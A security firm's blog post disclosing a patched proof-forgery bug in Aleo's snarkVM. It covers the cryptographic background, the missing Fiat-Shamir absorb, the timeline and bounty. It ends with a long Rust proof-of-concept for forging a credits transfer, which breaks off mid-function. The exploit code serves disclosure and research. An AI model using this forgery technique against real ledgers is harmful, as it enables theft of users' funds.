---
schema_version: "1.0.0"
document_id: "8d0799bb15e5aed207546e2c74f35f303805326eb2b38da70147eb6a7351717e"
company_key: "yc-veria-labs"
company: "Veria Labs"
source_id: "yc-veria-labs-rss-80fd8934189a"
canonical_url: "https://verialabs.com/blog/forging-transactions-on-aleo/"
published_at: "2026-06-15T00:00:00+00:00"
first_seen_at: "2026-07-20T23:20:58.723115+00:00"
fetched_at: "2026-07-28T21:13:18.116875+00:00"
content_hash: "sha256:df485ebc930afc415d5b17c976c5a3c4465965d67631150da0a5d5331088a76d"
---

# How Veria AI Found an Arbitrary Proof Forgery in Aleo

**Forging Transactions on Aleo** A $65,000 Proof Forgery


Jun 15, 2026


#zkvm #cryptography #bug-bounty


In blockchain, a single vulnerability can drain funds in seconds with no way to recover them. That sets the security bar extremely high, and regular pentests and audits are mandatory.


This blog covers how our AI agent found a critical vulnerability in Aleo’s snarkVM that put the entire value of the chain at risk, and a full technical breakdown of how the forgery actually works. It is one of two vulnerabilities we responsibly disclosed; a separate writeup covers the second (an infinite mint).


This disclosure awarded us the maximum possible bug bounty of $65,000 for the responsible disclosure of this critical vulnerability.


## TL;DR


- We pointed Veria AI at Aleo’s snarkVM and it autonomously found a way to siphon every token held on the chain.
- The root cause: a missing Fiat-Shamir absorb caused arbitrary proof forgery.
- The issue: anyone could send any transaction from any known wallet address.
- The result: Veria alerted core developers who immediately rolled out a fix to validators.
- The Aleo team was able to scan all mainnet and testnet transactions and conclude that the vulnerability had not been exploited.


## About Us


At Veria Labs, we build AI pentesting agents that automatically find and fix security vulnerabilities in your application. Founded by members of the #1 competitive hacking team in the U.S., we’ve found critical vulnerabilities in every company we’ve worked with, from small startups to enterprise giants.


Think we can help secure your systems? We’d love to chat! Book a call[here](https://verialabs.com/contact) .


## The Veria Labs AI Agent


From the beginning of the company, our mission has focused on building an AI agent that can find vulnerabilities no human security engineer has found before, inside extremely dense and large codebases. What better proving ground than a zkVM?


zkVMs are among the hardest codebases to audit in all of security, for three main reasons:


1. **Abstract algebra & pairings:** The core of a zkVM is built on polynomials, commitment schemes, and bilinear pairings. This math demands heavy specialization to audit correctly.
2. **The SNARK protocol:** Above all the classical cryptography sits the SNARK itself. It contains multiple rounds of polynomial commitments, stitched together by a Fiat-Shamir transform to make it non-interactive.
3. **The VM:** The virtual machine itself is another vector, responsible for generating proofs and verifying state changes.


An agent capable of finding vulnerabilities in a zkVM must handle all three factors simultaneously and reason precisely about where a vulnerability does (and does not) exist.


## What is Aleo?


Aleo is a privacy-preserving Layer 1 blockchain with a native token (ALEO). By using zero-knowledge proofs, it lets transaction data stay completely private while remaining verifiable on chain.


Every transaction on Aleo is a zk proof. Whether it’s an interaction with a smart contract or a normal transfer, the user proves authorization of the transfer, the total amount of tokens, and that no new money was created, all without revealing who sent what to whom. To make this work, Aleo built their own zkVM ([snarkVM](https://github.com/ProvableHQ/snarkVM) ) as a general library for arbitrary zk proof generation and verification. snarkVM is then wired into the consensus layer ([snarkOS](https://github.com/ProvableHQ/snarkOS) ) so every validator on the network runs the same verification logic for every transaction.


Aleo’s snarkVM has gone through multiple rounds of audits from top-tier auditing and pentesting firms, plus continuous internal security review, tooling, and a live bug bounty. That made it the perfect place to stress-test our agent. If you can forge one of these proofs, you don’t just break the zkVM, you break the entire chain.


## How Our AI Found It


We left our agent to look through the codebase and ping us whenever it found a bug.


After four hours, it came back with a vulnerability in the polynomial commitment scheme implementation inside snarkVM. Coming from a deep cryptography background, I of course hopped on it immediately to fully confirm and validate the bug. After skimming through snarkVM and cross-referencing how it was used in[snarkOS](https://github.com/ProvableHQ/snarkOS) , it was clear the agent had found a critical vulnerability affecting the entire value of the chain.


In short, here’s how it got there:


The agent first spread throughout the codebase, mapping areas likely to contain bugs. On one of its paths, it walked through Varuna, Aleo’s SNARK algorithm. Going through the algorithm round by round, it traced the Fiat-Shamir sponge across all five rounds of the protocol.


When the agent arrived at the last round of Varuna, it found that the very last check (the batched polynomial commitment verification) had a vulnerability: the verifier was squeezing random batch weights without absorbing the witness values they were supposed to bind.


With the bug identified, the agent was tasked to extrapolate it to the entirety of the zkVM. It walked the call graph upward from the vulnerable function all the way to the entrypoint where a user inputs data, and constructed a full PoC to prove it worked. Completely autonomously.


It went from a 400,000-line codebase, to a single vulnerable function, to a full end-to-end program capable of draining every wallet on the chain. In a single run.


The rest of this post is the deep technical breakdown of exactly how that forgery works.


## The Longggggg Background


This will get quite math-heavy. Bear with us. Skip to the vulnerability section if this gets too boring.


### KZG10


[KZG10](https://en.wikipedia.org/wiki/Commitment_scheme) is a polynomial commitment scheme that powers the snarkVM. It lets the prover commit to a polynomial p(x)∈𝔽\[x\] with an elliptic curve point, then prove the evaluation p(z)=v at any point z with a curve point as an opening proof. snarkVM uses KZG10 over the BLS12-377 pairing curve E with prime fields 𝔽r as its scalar field and 𝔽q as its base field.


The public parameters are 𝔾1,𝔾2, and 𝔾T, with generators G1∈𝔾1,G2∈𝔾2 and a bilinear pairing e:𝔾𝟙×𝔾𝟚→𝔾T.


#### Setup


KZG10 requires a trusted setup, which snarkVM implements with “powers of τ” in both source groups of pairings. Let d be the maximum degree of the committed polynomials (publicly chosen).


𝗌𝗋𝗌=(\[1\]1, \[τ\]1, \[τ2\]1, …, \[τd\]1, \[1\]2, \[τ\]2,...)


where \[x\]1=x⋅G1∈𝔾1, \[x\]2=x⋅G2∈𝔾2, and the private value τ∈𝔽r is discarded after setup.


#### Commit & Open


A commitment to p(x)=∑icixi is p evaluated at τ “in the exponent”:


C=\[p(τ)\]1=∑ici⋅\[τi\]1∈𝔾1


To open at a point z, the prover constructs the quotient polynomial


q(x)=p(x)−vx−z


(which is a polynomial iff p(z)=v, by the factor theorem) and outputs the witness W=\[q(τ)\]1. Then, reveal (z,v,W).


#### Verify


Using the bilinear pairing e:𝔾1×𝔾2→𝔾T, the verifier checks:


e(C−\[v\]1, \[1\]2)=?e(W, \[τ−z\]2)


This holds iff p(τ)−v=(τ−z)⋅q(τ) i.e., iff z is genuinely a root of p(x)−v, which is the statement p(z)=v. KZG10’s soundness property rests on the prover not knowing τ. In order to forge a proof for a false evaluation v, the prover would need to compute \[1τ−z\]1 from 𝗌𝗋𝗌. This is assumed to be hard.


### SonicKZG10 Batch Verification


In a zkSNARK, many polynomials must open at many different points. For example, a single Aleo transaction’s proof opens roughly a dozen Varuna polynomials at three different challenge points α,β,γ. Performing one pairing per opening would be horrendously slow in transaction verification, so the SonicKZG10 layer in` algorithms/src/polycommit/sonic_pc/mod.rs` compresses the batch into a single pairing equation.


Why does this matter so much? Pairings are among the most expensive operations the verifier performs. Every validator on the network must independently re-run this verification for every transaction before accepting it into a block. A naive scheme with one pairing per opening, dozens per transaction, and dozens of transactions per block would heavily inflate validation time. Batching amortizes all of those openings into a single pairing check, keeping Aleo fast.


The verifier samples two kinds of random scalars:


- Combine all polynomials opened at the same point zj into one virtual polynomial. For a query group at point zj containing p1,j,…,pk,j with commitments Ci,j and evaluations vi,j, define: C~j=∑iξi,j⋅Ci,j,v~j=∑iξi,j⋅vi,j
- Combine the per-point checks across different points zj.


Then the full aggregated check becomes:


e(∑jρj⋅(C~j−\[v~j\]1+zj⋅Wj), \[1\]2)=?e(∑jρj⋅Wj, \[τ\]2)


Taking discrete logs through the pairing, this collapses to the scalar identity:


∑jρj⋅\[(p~j(τ)−v~j)−(τ−zj)⋅wj\]⏟=0 for each honest opening=0


For each honest opening, the bracketed term is individually zero (that’s just the KZG identity), so the weighted sum is zero regardless of which ρj the verifier picked. The randomizers exist purely to prevent cancellation between malicious terms: if any opening were dishonest by amount δj, the sum would be ∑jρjδj, which is non-zero with overwhelming probability over random ρj.


### Fiat-Shamir


The challenges ξi,j and ρj are derived non-interactively via the Fiat-Shamir transform. snarkVM uses a Poseidon sponge 𝒮 over the BLS12-377 base field 𝔽q (see` crypto_hash::PoseidonSponge` ). Both parties update the sponge identically:


ρj+1←𝒮.squeeze_short_nonnative_field_element()


𝒮.absorb(all prover messages so far)


In order for this to satisfy the soundness property, every prover message that a challenge is meant to bind must be absorbed into the sponge before that challenge is squeezed.


If a prover can choose any message *after* a challenge that the challenge was supposed to constrain, the randomness goes away and a false proof can be constructed by effectively predicting the random value.


## The Vulnerability


Aleo’s snarkVM uses Varuna, a variant of[Marlin](https://eprint.iacr.org/2019/1047) . Each Aleo transaction carries a Varuna proof attesting that every transition (function call) inside the transaction satisfies its program’s R1CS constraint system.


Stripping out all blockchain-related code, the main zk function for attacking is` VarunaSNARK::verify_batch` .


```text
1   VM::check_transaction    2   └── VM::check_execution_internal    3          └── Process::verify_execution    4              └── Trace::verify_execution_proof    5                  └── Trace::verify_batch    6                      └── VerifyingKey::verify_batch    7                          └── VarunaSNARK::verify_batch
```


Inside this function, the verifier runs the Algebraic Holographic Proof (AHP) round-by-round, absorbing prover commitments and sampling challenges as it goes. The polynomials that ultimately get opened by SonicKZG10 include:


Polynomial AHP Round Query Point What it encodes


wi (one per batch instance) 1 β The private witness for transition i


𝗆𝖺𝗌𝗄𝗉𝗈𝗅𝗒 1 β Zero-knowledge masking (only in ZK mode)


h0 2 α Rowcheck quotient


g1, h1 3 β Univariate-sumcheck residual and quotient


ga, gb, gc (per circuit) 4 γ Matrix-sumcheck residuals for A,B,C


h2 5 γ Matrix-sumcheck quotient


These get reorganized into linear combinations (e.g. the rowcheck LC at α, the lineval LC at β, the matrix-sumcheck LC at γ) and handed to SonicKZG10 as a QuerySet with three distinct query points. On line 1057 of varuna.rs, the sponge has absorbed every commitment from rounds 1–5 plus all claimed evaluations. Then, it passes everything to` SonicKZG10::check_combinations` (which delegates to` batch_check` ).


` batch_check` iterates over query groups (one per distinct evaluation point: α,β,γ). For each group j, it calls` accumulate_elems` and then squeezes the next randomizer ρj+1.


```text
381   for   ((_query_name, (query, labels)), p)   in   query_to_labels_map  .  into_iter  ()  .  zip_eq  (  &  proof  .  0  ) {        14 collapsed lines    382         let     mut   comms_to_combine  :     Vec  <  &  '  _     LabeledCommitment  <_>>   =     Vec  ::  new  ();    383         let     mut   values_to_combine   =     Vec  ::  new  ();    384         for   label   in   labels  .  into_iter  () {    385             let   commitment   =    386                  commitments  .  get  (label)  .  ok_or  (  PCError  ::  MissingPolynomial   { label  :   label  .  to_string  () })  ?  ;    387
388             let   v_i   =   values    389                 .  get  (  &  (label  .  clone  (),   *  query))    390                 .  ok_or  (  PCError  ::  MissingEvaluation   { label  :   label  .  to_string  () })  ?  ;    391
392              comms_to_combine  .  push  (commitment);    393              values_to_combine  .  push  (  *  v_i);    394          }    395
396         Self  ::  accumulate_elems  (    397             &mut   combined_comms,    398             &mut   combined_witness,    399             &mut   combined_adjusted_witness,    400              vk,    401              comms_to_combine  .  into_iter  (),    402             *  query,    403              values_to_combine  .  into_iter  (),    404              p,   // <- contains W_j, Never absorbed into the sponge    405             Some  (randomizer),    406              fs_rng,    407          )  ?  ;    408
409          randomizer   =   fs_rng  .  squeeze_short_nonnative_field_element  ::  <  E  ::  Fr  >();    410   }
```


Inside` accumulate_elems` , the per-query opening challenges ξi,j are squeezed before the bases` \[vk.vk.g, -proof.w\]` are folded into the pairing accumulator. The function reads` proof.w` (which is Wj) to update` combined_witness` , but at no point does any code path call` fs_rng.absorb(proof.w)` .


The mirror image of this bug exists on the prover side in` batch_open` . An attacker running an offline copy of the Aleo verifier can therefore compute every ρj and every ξi,j before picking a single witness. They can compute forged witness polynomials that perfectly balance the aggregated pairing equation, even if the individual statements being proved are completely false.


## The Impact


Suppose an attacker wants to forge a proof that transfers tokens from a wallet they don’t own to their own wallet (stealing funds). They run the verifier’s AHP rounds against arbitrarily chosen commitments and evaluations, computing the residual the verifier would see for each query group.


In the PoC, we predicted the random values and constructed witness values that would satisfy the constraints of proof verification and the circuit.


```text
1   let   target   =   universal_verifier  .  vk  .  g   *   combined_value   -   combined_commitment;    2   let   witness_0   =   target   *   ((r_0   *   (z_0   -   z_1))  .  inverse  ()  .  unwrap  ());    3   let   witness_1   =     -  witness_0   *   (r_0   /   r_1);    4   let   witness_2   =   <  Bls12_377     as     PairingEngine  >  ::  G1Projective  ::  zero  ();
```


Concretely, this bug lets anyone:


1. Pick any wallet on the chain.
2. Construct a transaction draining that wallet into one the attacker controls.
3. Generate a forged proof asserting “I am allowed to authorize this transaction and transfer all funds” (which is entirely false).
4. Broadcast the transaction to the chain and steal the funds.


A forged proof on Aleo doesn’t just mean “an invalid proof gets accepted,” it means “an invalid transaction is accepted and committed to the blockchain.” The signature checks, balance checks, and authorization checks are all bypassed by the forged proof. And because this is a blockchain, once the transaction is broadcast there is no recovery or rollback.


At the time of submission, Aleo’s snarkVM secured the full balance of every wallet on the network. This meant an attacker could submit arbitrary transactions that siphoned funds from every wallet holding any token, effectively the entire value of the chain.


## Remediation & Thoughts


Because the vulnerability originated in batch verification rather than some other silently corruptible state-transition, every historical transaction on the chain still carries a proof that can be re-examined. Once the patch was in place, the Aleo team was able to scan all mainnet and testnet transactions and conclude that the vulnerability had not been exploited. No funds were stolen, and the integrity of the shielded pool remains intact.


Could this have been caught earlier? Up until this writeup, Aleo’s snarkVM had gone through multiple rounds of audits from multiple auditing firms. In this case, it seems the issue was missed during the auditing review period. It’s also worth mentioning that formal verification over the Varuna implementation would have caught this bug.


## Timeline


- 04/29/2026 - Vulnerability was identified by our agent
- 04/30/2026 - Vulnerability was PoC’d and submitted to bug bounty
- 05/01/2026 - Vulnerability was verified by the Aleo team and patches were issued the same night
- 05/03/2026 - Patches were tested and rolled out to every validator on mainnet
- 05/05/2026 - Veria AI receives the maximum bounty


## PoC


```text
1   use     super  ::*  ;    2
3   use     console  ::  {    4         account  ::  {  Address  ,   PrivateKey  },    5         network  ::  {  ConsensusVersion  ,   FiatShamirParameters  ,   Network  ,   TestnetV0  },    6         program  ::  {  Argument  ,   Future  ,   Identifier  ,   Literal  ,   Plaintext  , compute_function_id},    7         types  ::  {  Field  ,   U16  },    8   };    9   use     snarkvm_algorithms  ::  {    10         AlgebraicSponge  ,    11         fft  ::  EvaluationDomain  ,    12         polycommit  ::  {    13             kzg10  ::  {  KZGCommitment  ,   KZGProof  },    14             sonic_pc  ::  {  BatchLCProof  ,   BatchProof  ,   Evaluations     as     PCEvaluations  ,   LabeledCommitment  },    15          },    16         snark  ::  varuna  ::  {    17             AHPForR1CS  ,    18             CircuitId  ,    19             Commitments  ,    20             Evaluations     as     VarunaEvaluations  ,    21             Proof     as     VarunaProof  ,    22             VarunaHidingMode  ,    23             VarunaSNARK  ,    24             VarunaVersion  ,    25             WitnessCommitments  ,    26              prover,    27              witness_label,    28          },    29         srs  ::  UniversalVerifier  ,    30   };    31   use     snarkvm_curves  ::  {  PairingEngine  ,   ProjectiveCurve  };    32   use     snarkvm_fields  ::  {  One  ,   Zero  };    33   use     snarkvm_ledger_block  ::  {  Execution  ,   Output  ,   Transaction  ,   Transition  };    34   use     snarkvm_ledger_query  ::  {  Query  ,   QueryTrait  };    35   use     snarkvm_ledger_store  ::  ConsensusStore  ;    36   use     snarkvm_synthesizer_process  ::  {  Process  , execution_cost};    37   use     snarkvm_synthesizer_program  ::  StackTrait  ;    38   use     snarkvm_synthesizer_snark  ::  Proof  ;    39
40   use     aleo_std  ::  StorageMode  ;    41   use     anyhow  ::  {  Context  ,   Result  , anyhow, ensure};    42   use     itertools  ::  Itertools  ;    43   use     serde_json  ::  Value     as     JsonValue  ;    44   use     snarkvm_ledger_store  ::  helpers  ::  memory  ::  {  BlockMemory  ,   ConsensusMemory  };    45   use     std  ::  {    46         collections  ::  {  BTreeMap  ,   BTreeSet  ,   HashMap  },    47          env, fs,    48         ops  ::  Deref  ,    49         str  ::  FromStr  ,    50   };    51
52   type     CurrentNetwork     =     TestnetV0  ;    53   type     LedgerType     =     ConsensusMemory  <  CurrentNetwork  >;    54   type     CurrentQuery     =     Query  <  CurrentNetwork  ,   BlockMemory  <  CurrentNetwork  >>;    55   type     Pairing     =   <  CurrentNetwork     as     console  ::  prelude  ::  Environment  >  ::  PairingCurve  ;    56   type     Fr     =   <  Pairing     as     PairingEngine  >  ::  Fr  ;    57   type     G1     =   <  Pairing     as     PairingEngine  >  ::  G1Affine  ;    58   type     G1Projective     =   <  Pairing     as     PairingEngine  >  ::  G1Projective  ;    59   type     Varuna     =     VarunaSNARK  <  Pairing  , console  ::  network  ::  FiatShamir  <  CurrentNetwork  >,   VarunaHidingMode  >;    60
61   #[test]    62   #[ignore   =     "run explicitly from scripts/submit_credits_tx.py via --rust-forger-cmd"  ]    63   fn     forge_credits_transfer_public_from_context  ()   ->     Result  <()> {    64         let   context_path   =     env  ::  var  (  "SNARKOS_FORGE_CONTEXT"  )  .  context  (  "SNARKOS_FORGE_CONTEXT is not set"  )  ?  ;    65         let   output_path   =     env  ::  var  (  "SNARKOS_FORGED_TX"  )  .  context  (  "SNARKOS_FORGED_TX is not set"  )  ?  ;    66         let   context  :     JsonValue     =     serde_json  ::  from_str  (  &  fs  ::  read_to_string  (  &  context_path)  ?  )  ?  ;    67
68         let   endpoint   =     context_str  (  &  context,   "endpoint"  )  ?  ;    69         let   sender_private_key   =     PrivateKey  ::  <  CurrentNetwork  >  ::  from_str  (  context_str  (  &  context,   "sender_private_key"  )  ?  )  ?  ;    70         let   sender_address   =     Address  ::  <  CurrentNetwork  >  ::  from_str  (  context_str  (  &  context,   "sender_address"  )  ?  )  ?  ;    71         let   recipient_address   =     Address  ::  <  CurrentNetwork  >  ::  from_str  (  context_str  (  &  context,   "recipient_address"  )  ?  )  ?  ;    72         let   amount   =   context    73             .  get  (  "amount_microcredits"  )    74             .  and_then  (  JsonValue  ::  as_u64)    75             .  ok_or_else  (  ||     anyhow!  (  "missing amount_microcredits"  ))  ?  ;    76         let   base_fee   =   context  .  get  (  "base_fee_microcredits"  )  .  and_then  (  JsonValue  ::  as_u64)  .  unwrap_or  (  100_000  );    77
78         ensure!  (  context_str  (  &  context,   "program"  )  ?     ==     "credits.aleo"  ,   "only credits.aleo is supported"  );    79         ensure!  (  context_str  (  &  context,   "function"  )  ?     ==     "transfer_public"  ,   "only transfer_public is supported"  );    80
81         let   honest_tx_value   =   context  .  get  (  "honest_tx"  )  .  ok_or_else  (  ||     anyhow!  (  "missing honest_tx"  ))  ?.  clone  ();    82         let   honest_transaction  :     Transaction  <  CurrentNetwork  >   =     serde_json  ::  from_value  (honest_tx_value)  ?  ;    83         let   honest_execution   =    84              honest_transaction  .  execution  ()  .  ok_or_else  (  ||     anyhow!  (  "honest_tx is not an execute transaction"  ))  ?  ;    85         ensure!  (honest_execution  .  len  ()   ==     1  ,   "expected a single-transition credits.aleo execution"  );    86         let   original_transition   =   honest_execution  .  peek  ()  ?  ;    87         ensure!  (original_transition  .  program_id  ()  .  to_string  ()   ==     "credits.aleo"  );    88         ensure!  (original_transition  .  function_name  ()  .  to_string  ()   ==     "transfer_public"  );    89         ensure!  (original_transition  .  outputs  ()  .  len  ()   ==     1  ,   "expected exactly one future output"  );    90
91         let   process   =     Process  ::  <  CurrentNetwork  >  ::  load  ()  ?  ;    92
93         let   query   =     CurrentQuery  ::  try_from  (endpoint)  ?  ;    94         let   current_height   =   query  .  current_block_height  ()  ?  ;    95         let   consensus_version   =     CurrentNetwork  ::  CONSENSUS_VERSION  (current_height)  ?  ;    96         let   varuna_version   =     match   (  ConsensusVersion  ::  V1  ..=  ConsensusVersion  ::  V3  )  .  contains  (  &  consensus_version) {    97             true     =>     VarunaVersion  ::  V1  ,    98             false     =>     VarunaVersion  ::  V2  ,    99          };    100         println!  (    101             "endpoint height {current_height} resolved to {consensus_version:?}; forging execution proof with {varuna_version:?}"    102          );    103
104         let   function_name   =     Identifier  ::  <  CurrentNetwork  >  ::  from_str  (  "transfer_public"  )  ?  ;    105         let   network_id   =     U16  ::  <  CurrentNetwork  >  ::  new  (  CurrentNetwork  ::  ID  );    106         let   function_id   =     compute_function_id  (  &  network_id, original_transition  .  program_id  (),   &  function_name)  ?  ;    107
108         let   tampered_future   =     Future  ::  <  CurrentNetwork  >  ::  new  (  *  original_transition  .  program_id  (), function_name,   vec!  [    109             Argument  ::  Plaintext  (  Plaintext  ::  from  (  Literal  ::  Address  (recipient_address))),    110             Argument  ::  Plaintext  (  Plaintext  ::  from  (  Literal  ::  Address  (sender_address))),    111             Argument  ::  Plaintext  (  Plaintext  ::  from_str  (  &  format!  (  "{amount}u64"  ))  ?  ),    112          ]);    113
114         let     mut   preimage  :     Vec  <  Field  <  CurrentNetwork  >>   =     Vec  ::  new  ();    115          preimage  .  push  (function_id);    116          preimage  .  extend  (tampered_future  .  to_fields  ()  ?  );    117          preimage  .  push  (  *  original_transition  .  tcm  ());    118          preimage  .  push  (  Field  ::  <  CurrentNetwork  >  ::  from_u16  (original_transition  .  inputs  ()  .  len  ()   as     u16  ));    119         let   new_output_hash   =     CurrentNetwork  ::  hash_psd8  (  &  preimage)  ?  ;    120
121         let     mut   tampered_outputs   =   original_transition  .  outputs  ()  .  to_vec  ();    122          tampered_outputs[  0  ]   =     Output  ::  Future  (new_output_hash,   Some  (tampered_future));    123
124         let   tampered_transition   =     Transition  ::  <  CurrentNetwork  >  ::  new  (    125             *  original_transition  .  program_id  (),    126             *  original_transition  .  function_name  (),    127              original_transition  .  inputs  ()  .  to_vec  (),    128              tampered_outputs,    129             *  original_transition  .  tpk  (),    130             *  original_transition  .  tcm  (),    131             *  original_transition  .  scm  (),    132          )  ?  ;    133
134         let   tampered_with_honest_proof   =     Execution  ::  <  CurrentNetwork  >  ::  from  (    135             std  ::  iter  ::  once  (tampered_transition  .  clone  ()),    136              honest_execution  .  global_state_root  (),    137              honest_execution  .  proof  ()  .  cloned  (),    138          )  ?  ;    139
140         let   derived_inputs   =     transition_verifier_inputs  (  &  process,   &  tampered_with_honest_proof,   &  network_id)  ?  ;    141         let   verifying_key   =   process    142             .  get_stack  (tampered_transition  .  program_id  ())  ?    143             .  get_verifying_key  (tampered_transition  .  function_name  ())  ?  ;    144
145         let   forged_varuna_proof   =     forge_varuna_proof_concrete  (    146             CurrentNetwork  ::  varuna_universal_verifier  (),    147             CurrentNetwork  ::  varuna_fs_parameters  (),    148              varuna_version,    149              verifying_key  .  deref  (),    150             &  derived_inputs,    151          )  ?  ;    152
153         let   forged_execution   =     Execution  ::  <  CurrentNetwork  >  ::  from  (    154             std  ::  iter  ::  once  (tampered_transition),    155              honest_execution  .  global_state_root  (),    156             Some  (  Proof  ::  <  CurrentNetwork  >  ::  new  (forged_varuna_proof)),    157          )  ?  ;    158
159         let   store   =     ConsensusStore  ::  <  CurrentNetwork  ,   LedgerType  >  ::  open  (  StorageMode  ::  new_test  (  None  ))  ?  ;    160         let   vm   =     VM  ::  <  CurrentNetwork  ,   LedgerType  >  ::  from  (store)  ?  ;    161         let   (minimum_cost, _)   =     execution_cost  (  &  process,   &  forged_execution, consensus_version)  ?  ;    162         ensure!  (    163              base_fee   >=   minimum_cost,    164             "base_fee_microcredits ({base_fee}) is below local minimum cost ({minimum_cost})"    165          );    166         println!  (  "forged execution local minimum base fee: {minimum_cost} microcredits; paying {base_fee}"  );    167         let   execution_id   =   forged_execution  .  to_execution_id  ()  ?  ;    168         let   fee_authorization   =    169              vm  .  authorize_fee_public  (  &  sender_private_key, base_fee,   0  , execution_id,   &mut     TestRng  ::  default  ())  ?  ;    170         let   forged_fee   =   vm  .  execute_fee_authorization  (fee_authorization,   Some  (  &  query),   &mut     TestRng  ::  default  ())  ?  ;    171         let   forged_transaction   =     Transaction  ::  from_execution  (forged_execution,   Some  (forged_fee))  ?  ;    172
173         fs  ::  write  (  &  output_path,   serde_json  ::  to_string_pretty  (  &  forged_transaction)  ?     +     "  \n  "  )  ?  ;    174         println!  (    175             "wrote forged credits.aleo transaction {} to {}"  ,    176              forged_transaction  .  id  (),    177              output_path    178          );    179         Ok  (())    180   }    181
182   fn     context_str  <'  a  >(context  :     &  '  a     JsonValue  , key  :     &  str  )   ->     Result  <  &  '  a     str  > {    183          context  .  get  (key)  .  and_then  (  JsonValue  ::  as_str)  .  ok_or_else  (  ||     anyhow!  (  "missing string context key '{key}'"  ))    184   }    185
186   fn     transition_verifier_inputs  (    187          process  :     &  Process  <  CurrentNetwork  >,    188          execution  :     &  Execution  <  CurrentNetwork  >,    189          network_id  :     &  U16  <  CurrentNetwork  >,    190   )   ->     Result  <  Vec  <  Fr  >> {    191         let   call_graph   =   process  .  construct_call_graph  (execution  .  transitions  ())  ?  ;    192         let   reverse_call_graph   =     Process  ::  <  CurrentNetwork  >  ::  reverse_call_graph  (  &  call_graph);    193         let     mut   transition_map   =     HashMap  ::  new  ();    194         for   transition   in   execution  .  transitions  () {    195             let   stack   =   process  .  get_stack  (transition  .  program_id  ())  ?  ;    196             let   function   =   stack  .  get_function  (transition  .  function_name  ())  ?  ;    197              transition_map  .  insert  (  *  transition  .  id  (), (transition, function));    198          }    199         let     mut   function_id_cache   =     HashMap  ::  new  ();    200         let   transition   =   execution  .  peek  ()  ?  ;    201         let   stack   =   process  .  get_stack  (transition  .  program_id  ())  ?  ;    202         let   parent   =   reverse_call_graph  .  get  (transition  .  id  ())  .  and_then  (  |  tid  |   execution  .  get_program_id  (tid));    203         let   program_checksum   =     match   stack  .  program  ()  .  contains_constructor  () {    204             true     =>     Some  (  *  stack  .  program_checksum_as_field  ()  ?  ),    205             false     =>     None  ,    206          };    207          process  .  to_transition_verifier_inputs  (    208              transition,    209              parent,    210             &  call_graph,    211              program_checksum,    212             &  transition_map,    213             &mut   function_id_cache,    214              network_id,    215          )    216   }    217
218   fn     forge_varuna_proof_concrete  (    219          universal_verifier  :     &  UniversalVerifier  <  Pairing  >,    220          fs_parameters  :     &  FiatShamirParameters  <  CurrentNetwork  >,    221          varuna_version  :     VarunaVersion  ,    222          verifying_key  :     &  snarkvm_algorithms  ::  snark  ::  varuna  ::  CircuitVerifyingKey  <  Pairing  >,    223          false_public_inputs  :     &  [  Fr  ],    224   )   ->     Result  <  VarunaProof  <  Pairing  >> {    225         let   public_input_batch   =   [false_public_inputs  .  to_vec  ()];    226         let     mut   vks_to_inputs   =    227             BTreeMap  ::  <  &  snarkvm_algorithms  ::  snark  ::  varuna  ::  CircuitVerifyingKey  <  Pairing  >,   &  [  Vec  <  Fr  >]>  ::  new  ();    228          vks_to_inputs  .  insert  (verifying_key, public_input_batch  .  as_slice  ());    229
230         let   zero_commitment   =     KZGCommitment  ::  <  Pairing  >  ::  empty  ();    231         let   batch_sizes   =     BTreeMap  ::  from  ([(verifying_key  .  id,   1  usize  )]);    232         let   commitments   =     Commitments   {    233              witness_commitments  :     vec!  [  WitnessCommitments   { w  :   zero_commitment }],    234              mask_poly  :     Some  (zero_commitment),    235              h_0  :   zero_commitment,    236              g_1  :   zero_commitment,    237              h_1  :   zero_commitment,    238              g_a_commitments  :     vec!  [zero_commitment],    239              g_b_commitments  :     vec!  [zero_commitment],    240              g_c_commitments  :     vec!  [zero_commitment],    241              h_2  :   zero_commitment,    242          };    243         let   evaluations   =     VarunaEvaluations   {    244              g_1_eval  :     Fr  ::  zero  (),    245              g_a_evals  :     vec!  [  Fr  ::  zero  ()],    246              g_b_evals  :     vec!  [  Fr  ::  zero  ()],    247              g_c_evals  :     vec!  [  Fr  ::  zero  ()],    248          };    249         let   third_msg   =     prover  ::  ThirdMessage   {    250              sums  :     vec!  [  vec!  [  prover  ::  MatrixSums   { sum_a  :     Fr  ::  zero  (), sum_b  :     Fr  ::  zero  (), sum_c  :     Fr  ::  zero  () }]],    251          };    252         let   fourth_msg   =    253             prover  ::  FourthMessage   { sums  :     vec!  [  prover  ::  MatrixSums   { sum_a  :     Fr  ::  zero  (), sum_b  :     Fr  ::  zero  (), sum_c  :     Fr  ::  zero  () }] };    254         let   placeholder_kzg   =     KZGProof  ::  <  Pairing  > { w  :     G1  ::  zero  (), random_v  :     Some  (  Fr  ::  zero  ()) };    255         let   empty_pc_proof   =     BatchLCProof   { proof  :     BatchProof  (  vec!  [placeholder_kzg;   3  ]) };    256         let     mut   forged_proof   =    257             VarunaProof  ::  <  Pairing  >  ::  new  (batch_sizes  .  clone  (), commitments, evaluations, third_msg, fourth_msg, empty_pc_proof)  ?  ;    258
259         let     mut   max_num_constraints   =     0  ;    260         let     mut   max_num_variables   =     0  ;    261         let     mut   max_non_zero_domain   =     None  ;    262         let     mut   public_inputs   =     BTreeMap  ::  new  ();    263         let     mut   padded_public_vec   =     Vec  ::  with_capacity  (vks_to_inputs  .  len  ());    264         let     mut   inputs_and_batch_sizes   =     BTreeMap  ::  new  ();    265         let     mut   circuit_infos   =     BTreeMap  ::  new  ();    266         let     mut   circuit_ids   =     Vec  ::  with_capacity  (vks_to_inputs  .  len  ());    267
268         for   (  &  vk,   &  public_inputs_i)   in   vks_to_inputs  .  iter  () {    269              max_num_constraints   =   max_num_constraints  .  max  (vk  .  circuit_info  .  num_constraints);    270              max_num_variables   =   max_num_variables  .  max  (vk  .  circuit_info  .  num_public_and_private_variables);    271             let   non_zero_domains   =    272                 AHPForR1CS  ::  <_,   VarunaHidingMode  >  ::  cmp_non_zero_domains  (  &  vk  .  circuit_info, max_non_zero_domain)  ?  ;    273              max_non_zero_domain   =   non_zero_domains  .  max_non_zero_domain;    274
